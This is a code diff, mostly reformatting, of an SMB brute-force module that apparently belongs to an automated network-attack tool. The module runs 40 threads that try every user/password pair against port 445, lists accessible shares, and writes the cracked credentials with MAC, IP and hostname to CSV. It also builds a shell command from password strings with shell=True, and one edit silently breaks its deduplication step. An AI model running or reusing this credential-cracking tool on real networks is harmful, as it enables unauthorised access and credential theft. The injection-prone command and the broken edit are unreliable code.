@@ -1,6 +1,7 @@
 """
 smb_connector.py - This script performs a brute force attack on SMB services (port 445) to find accessible shares using various user credentials. It logs the results of successful connections.
 """
+
 import os
 import pandas as pd
 import threading
@@ -25,12 +26,14 @@ b_port = 445
 b_parent = None
 
 # List of generic shares to ignore
-IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}
+IGNORED_SHARES = {"print$", "ADMIN$", "IPC$", "C$", "D$", "E$", "F$"}
+
 
 class SMBBruteforce:
     """
     Class to handle the SMB brute force process.
     """
+
     def __init__(self, shared_data):
         self.shared_data = shared_data
         self.smb_connector = SMBConnector(shared_data)
@@ -41,19 +44,21 @@ class SMBBruteforce:
         Run the SMB brute force attack on the given IP and port.
         """
         return self.smb_connector.run_bruteforce(ip, port)
-    
+
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute force attack and update status.
         """
         self.shared_data.bjornorch_status = "SMBBruteforce"
         success, results = self.bruteforce_smb(ip, port)
-        return 'success' if success else 'failed'
+        return "success" if success else "failed"
+
 
 class SMBConnector:
     """
     Class to manage the connection attempts and store the results.
     """
+
     def __init__(self, shared_data):
         self.shared_data = shared_data
         self.scan = pd.read_csv(shared_data.netkbfile)
@@ -99,11 +104,15 @@ class SMBConnector:
                 if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                     continue
                 try:
-                    conn.listPath(share.name, '/')
+                    conn.listPath(share.name, "/")
                     accessible_shares.append(share.name)
-                    logger.info(f"Access to share {share.name} successful on {adresse_ip} with user '{user}'")
+                    logger.info(
+                        f"Access to share {share.name} successful on {adresse_ip} with user '{user}'"
+                    )
                 except Exception as e:
-                    logger.error(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
+                    logger.error(
+                        f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}"
+                    )
             conn.close()
             return accessible_shares
         except Exception as e:
@@ -113,17 +122,21 @@ class SMBConnector:
         """
         Attempt to list shares using smbclient -L command.
         """
-        command = f'smbclient -L {adresse_ip} -U {user}%{password}'
+        command = f"smbclient -L {adresse_ip} -U {user}%{password}"
         try:
             process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
             stdout, stderr = process.communicate()
             if b"Sharename" in stdout:
-                logger.info(f"Successful authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L") 
+                logger.info(
+                    f"Successful authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L"
+                )
                 logger.info(stdout.decode())
                 shares = self.parse_shares(stdout.decode())
                 return shares
             else:
-                logger.error(f"Failed authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L")
+                logger.error(
+                    f"Failed authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L"
+                )
                 return []
         except Exception as e:
             logger.error(f"Error executing command '{command}': {e}")
@@ -136,7 +149,11 @@ class SMBConnector:
         shares = []
         lines = smbclient_output.splitlines()
         for line in lines:
-            if line.strip() and not line.startswith("Sharename") and not line.startswith("---------"):
+            if (
+                line.strip()
+                and not line.startswith("Sharename")
+                and not line.startswith("---------")
+            ):
                 parts = line.split()
                 if parts and parts[0] not in IGNORED_SHARES:
                     shares.append(parts[0])
@@ -148,7 +165,9 @@ class SMBConnector:
         """
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
+                logger.info(
+                    "Orchestrator exit signal received, stopping worker thread."
+                )
                 break
 
             adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
@@ -157,8 +176,20 @@ class SMBConnector:
                 with self.lock:
                     for share in shares:
                         if share not in IGNORED_SHARES:
-                            self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                            logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}")
+                            self.results.append(
+                                [
+                                    mac_address,
+                                    adresse_ip,
+                                    hostname,
+                                    share,
+                                    user,
+                                    password,
+                                    port,
+                                ]
+                            )
+                            logger.success(
+                                f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}"
+                            )
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
@@ -168,32 +199,49 @@ class SMBConnector:
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
-        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
-        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
+        mac_address = self.scan.loc[
+            self.scan["IPs"] == adresse_ip, "MAC Address"
+        ].values[0]
+        hostname = self.scan.loc[self.scan["IPs"] == adresse_ip, "Hostnames"].values[0]
 
         total_tasks = len(self.users) * len(self.passwords)
-        
+
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                    logger.info(
+                        "Orchestrator exit signal received, stopping bruteforce task addition."
+                    )
                     return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
+                self.queue.put(
+                    (adresse_ip, user, password, mac_address, hostname, port)
+                )
 
         success_flag = [False]
         threads = []
-        
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
+
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        ) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
-            
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
+
+            for _ in range(
+                40
+            ):  # Adjust the number of threads based on the RPi Zero's capabilities
+                t = threading.Thread(
+                    target=self.worker, args=(progress, task_id, success_flag)
+                )
                 t.start()
                 threads.append(t)
 
             while not self.queue.empty():
                 if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                    logger.info(
+                        "Orchestrator exit signal received, stopping bruteforce."
+                    )
                     while not self.queue.empty():
                         self.queue.get()
                         self.queue.task_done()
@@ -206,7 +254,9 @@ class SMBConnector:
 
         # If no success with direct SMB connection, try smbclient -L
         if not success_flag[0]:
-            logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
+            logger.info(
+                f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}"
+            )
             for user in self.users:
                 for password in self.passwords:
                     progress.update(task_id, advance=1)
@@ -215,22 +265,52 @@ class SMBConnector:
                         with self.lock:
                             for share in shares:
                                 if share not in IGNORED_SHARES:
-                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                                    logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
+                                    self.results.append(
+                                        [
+                                            mac_address,
+                                            adresse_ip,
+                                            hostname,
+                                            share,
+                                            user,
+                                            password,
+                                            port,
+                                        ]
+                                    )
+                                    logger.success(
+                                        f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L"
+                                    )
                                     self.save_results()
                                     self.removeduplicates()
                                     success_flag[0] = True
                     if self.shared_data.timewait_smb > 0:
-                        time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
+                        time.sleep(
+                            self.shared_data.timewait_smb
+                        )  # Wait for the specified interval before the next attempt
 
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
+        return (
+            success_flag[0],
+            self.results,
+        )  # Return True and the list of successes if at least one attempt was successful
 
     def save_results(self):
         """
         Save the results of successful connection attempts to a CSV file.
         """
-        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'Share', 'User', 'Password', 'Port'])
-        df.to_csv(self.smbfile, index=False, mode='a', header=not os.path.exists(self.smbfile))
+        df = pd.DataFrame(
+            self.results,
+            columns=[
+                "MAC Address",
+                "IP Address",
+                "Hostname",
+                "Share",
+                "User",
+                "Password",
+                "Port",
+            ],
+        )
+        df.to_csv(
+            self.smbfile, index=False, mode="a", header=not os.path.exists(self.smbfile)
+        )
         self.results = []  # Reset temporary results after saving
 
     def removeduplicates(self):
@@ -238,24 +318,29 @@ class SMBConnector:
         Remove duplicate entries from the results CSV file.
         """
         df = pd.read_csv(self.smbfile)
-        df.drop_duplicates(inplace=True)
+        df.drop_duplicates()
         df.to_csv(self.smbfile, index=False)
+
 
 if __name__ == "__main__":
     shared_data = SharedData()
     try:
         smb_bruteforce = SMBBruteforce(shared_data)
-        logger.info("[bold green]Starting SMB brute force attack on port 445[/bold green]")
-        
+        logger.info(
+            "[bold green]Starting SMB brute force attack on port 445[/bold green]"
+        )
+
         # Load the netkb file and get the IPs to scan
         ips_to_scan = shared_data.read_data()
-        
+
         # Execute the brute force on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             smb_bruteforce.execute(ip, b_port, row, b_status)
-        
-        logger.info(f"Total number of successful attempts: {len(smb_bruteforce.smb_connector.results)}")
+
+        logger.info(
+            f"Total number of successful attempts: {len(smb_bruteforce.smb_connector.results)}"
+        )
         exit(len(smb_bruteforce.smb_connector.results))
     except Exception as e:
         logger.error(f"Error: {e}")
